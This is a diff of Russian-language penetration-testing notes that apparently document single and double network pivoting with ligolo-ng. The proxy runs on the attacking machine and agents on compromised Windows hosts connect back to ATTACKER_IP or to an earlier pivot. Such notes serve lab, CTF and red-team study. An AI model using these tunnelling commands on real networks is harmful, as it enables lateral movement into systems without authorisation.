@@ -49,12 +49,12 @@ sudo ip route add 172.16.8.0/24 dev ligolo
 
 1) На атакующей запускаем 
 ```bash
-ligolo-ng proxy --selfcert -laddr 0.0.0.0:443
+proxy --selfcert -laddr 0.0.0.0:443
 ```
 
 2) На Pivot хосте запускаем
 ```bash
-agent.exe -connect ATTACKER_IP:443 -ignore-cert
+agent -connect ATTACKER_IP:443 -ignore-cert
 ```
 
 
@@ -62,14 +62,14 @@ agent.exe -connect ATTACKER_IP:443 -ignore-cert
 
 1. Повторяем шаги из простого Pivot
 
-2. далее на 1 Pivot хосте (где запущен агент) включаем релей
+2. далее на 1 Pivot хосте (где запущен агент) включаем listener
 ```bash
-ligolo-ng relay -connect <KALI_IP>:11601 -ignore-cert
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:443 
 ```
 
 3. На следующем Pivot хосте (Windows 2)  запускаем уже там агента
 ```bash
-agent.exe -connect <IP_WINDOWS_1>:11601 -ignore-cert
+agent.exe -connect <IP_WINDOWS_1>:4444 -ignore-cert
 ```
 
 4. На атакующей машине:
